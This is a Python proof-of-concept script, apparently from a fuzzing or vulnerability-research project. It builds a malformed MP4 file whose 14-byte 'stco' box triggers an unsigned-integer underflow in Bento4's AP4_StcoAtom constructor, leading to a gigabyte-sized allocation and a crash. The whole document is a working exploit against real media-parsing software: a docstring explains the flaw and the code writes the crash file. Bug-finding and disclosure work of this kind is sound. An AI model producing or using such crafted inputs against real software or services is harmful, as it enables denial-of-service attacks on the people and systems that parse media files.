"""
VULN 006 – AP4_StcoAtom unsigned-integer underflow in cap calculation
=====================================================================

Vulnerability location: Ap4StcoAtom.cpp, constructor (line 78)

    stream.ReadUI32(m_EntryCount);
    if (m_EntryCount > (size - AP4_FULL_ATOM_HEADER_SIZE - 4) / 4) {
        m_EntryCount = (size - AP4_FULL_ATOM_HEADER_SIZE - 4) / 4;
    }
    m_Entries = new AP4_UI32[m_EntryCount];        // <-- crash here

When size = 14 (AP4_UI32):
    (14 - 12 - 4) as AP4_UI32 = 0xFFFFFFFE  (unsigned underflow!)
    cap = 0xFFFFFFFE / 4 = 0x3FFFFFFF

entry_count = 0x10000000 is NOT > 0x3FFFFFFF, so it is NOT clamped.
new AP4_UI32[0x10000000] = 1 GiB allocation → std::bad_alloc → abort.

Stream is NOT wrapped in a substream per-atom; AP4_AtomFactory passes
the raw file stream directly to AP4_StcoAtom::Create(), so the
ReadUI32(m_EntryCount) read extends into the bytes immediately after
the 14-byte stco box declaration (still within the stbl parent).

Box layout:
    stco offset  0- 3:  size = 0x0000000E (14)
    stco offset  4- 7:  type = 'stco'
    stco offset  8:     version = 0
    stco offset  9-11:  flags = 0x000000
    stco offset 12-13:  bytes 0-1 of entry_count = 0x10, 0x00
    stco offset 14-15:  bytes 2-3 of entry_count = 0x00, 0x00  ← from stbl padding
    Combined entry_count = 0x10000000
"""

import struct, os

OUT = ("/data/ylwang/non-textfuzz/target/_poc/"
       "Bento4/Source_C++_Core_Ap4AtomFactory_h/vuln_006.mp4")

# ── helpers ──────────────────────────────────────────────────────────────────

def box(btype: bytes, data: bytes = b'') -> bytes:
    """Standard MP4 box: size(4) + type(4) + data."""
    return struct.pack('>I', 8 + len(data)) + btype + data

def full_box(btype: bytes, version: int, flags: int,
             data: bytes = b'') -> bytes:
    """Full-box: size(4) + type(4) + version(1) + flags(3) + data."""
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 4 bytes
    return box(btype, hdr + data)

# ── standard boxes ────────────────────────────────────────────────────────────

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# mvhd (version=0): creation_time, modification_time, timescale, duration,
#   rate, volume, reserved(10), matrix(36), pre_defined(24), next_track_id
mvhd_payload  = struct.pack('>IIII', 0, 0, 1000, 0)   # ct, mt, ts, dur
mvhd_payload += struct.pack('>I', 0x00010000)           # rate = 1.0
mvhd_payload += struct.pack('>H', 0x0100)               # volume = 1.0
mvhd_payload += b'\x00' * 10                            # reserved
mvhd_payload += struct.pack('>9i',                      # matrix (identity)
                             0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_payload += b'\x00' * 24                            # pre_defined
mvhd_payload += struct.pack('>I', 2)                    # next_track_id
mvhd = full_box(b'mvhd', 0, 0, mvhd_payload)

# tkhd (version=0)
tkhd_payload  = struct.pack('>IIII', 0, 0, 1, 0)       # ct, mt, track_id, reserved
tkhd_payload += struct.pack('>I', 0) + b'\x00' * 8     # duration, reserved(8)
tkhd_payload += struct.pack('>HH', 0, 0)                # layer, alternate_group
tkhd_payload += struct.pack('>H', 0x0100) + b'\x00'*2  # volume, reserved
tkhd_payload += struct.pack('>9i',                      # matrix (identity)
                             0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_payload += struct.pack('>II', 0, 0)                # width, height
tkhd = full_box(b'tkhd', 0, 3, tkhd_payload)

# mdhd (version=0)
mdhd_payload  = struct.pack('>IIII', 0, 0, 44100, 0)   # ct, mt, timescale, duration
mdhd_payload += struct.pack('>HH', 0, 0)                # language, pre_defined
mdhd = full_box(b'mdhd', 0, 0, mdhd_payload)

# hdlr (audio)
hdlr_payload  = struct.pack('>I', 0)                    # pre_defined
hdlr_payload += b'soun'                                 # handler_type
hdlr_payload += b'\x00' * 12                            # reserved
hdlr_payload += b'SoundHandler\x00'                     # name
hdlr = full_box(b'hdlr', 0, 0, hdlr_payload)

# dinf / dref
url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)

# smhd
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# stbl child boxes
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stsc = full_box(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))

# ── MALFORMED stco box (the actual exploit payload) ───────────────────────────
#
# Declared size = 14.  Layout inside the 14 raw bytes:
#   [0- 3]  size  = 0x0000000E
#   [4- 7]  type  = b'stco'
#   [8]     version = 0x00
#   [9-11]  flags   = 0x00 0x00 0x00
#   [12-13] entry_count MSBytes = 0x10 0x00   ← first 2 of 4 bytes
#
# AP4_AtomFactory passes the raw file stream to AP4_StcoAtom::Create().
# The constructor's ReadUI32(m_EntryCount) reads 4 bytes starting at offset 12
# inside the stco position, which straddles the box boundary into the stbl
# padding bytes that follow:
#   [14-15] = 0x00 0x00   ← placed in stbl padding right after the stco box
#
# Resulting entry_count = 0x10000000
# cap = (14 - 12 - 4) / 4  (all AP4_UI32)
#      = 0xFFFFFFFE / 4 = 0x3FFFFFFF     ← underflow!
# 0x10000000 <= 0x3FFFFFFF → NOT clamped
# new AP4_UI32[0x10000000] → ~1 GiB alloc → std::bad_alloc → crash
#
stco_malformed = (
    struct.pack('>I', 14)   # size = 14
    + b'stco'               # type
    + b'\x00\x00\x00\x00'  # version(1) + flags(3) = all zeros
    + b'\x10\x00'           # bytes 12-13: high bytes of entry_count 0x10000000
    # ← 14 bytes total, box ends here
)

# These 2 bytes sit immediately after stco in stbl's content.
# They are the low 2 bytes that complete the ReadUI32(entry_count) call.
stco_boundary_pad = b'\x00\x00'   # → entry_count = 0x10_00_00_00

# ── assemble stbl ─────────────────────────────────────────────────────────────
#
# bytes_available when stco is parsed =
#   stbl_content_size - stsd(16) - stts(16) - stsc(16) - stsz(20)
#                     = 84 - 68 = 16
# size check: 14 > 0, 14 >= 8, 14 <= 16  → PASS
stbl_content = (stsd + stts + stsc + stsz
                + stco_malformed + stco_boundary_pad)
stbl = box(b'stbl', stbl_content)

minf = box(b'minf', smhd + dinf + stbl)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)
moov = box(b'moov', mvhd + trak)

# ── write file ────────────────────────────────────────────────────────────────
data = ftyp + moov
os.makedirs(os.path.dirname(OUT), exist_ok=True)
with open(OUT, 'wb') as f:
    f.write(data)

print(f"Written {OUT}  ({len(data)} bytes)")
print(f"  stco box size declared: 14")
print(f"  entry_count will be read as: 0x10000000 = {0x10000000}")
print(f"  cap will compute to: 0x{0x3FFFFFFF:08X} (unsigned underflow)")
print(f"  allocation: new AP4_UI32[0x10000000] = ~1 GiB → bad_alloc → crash")
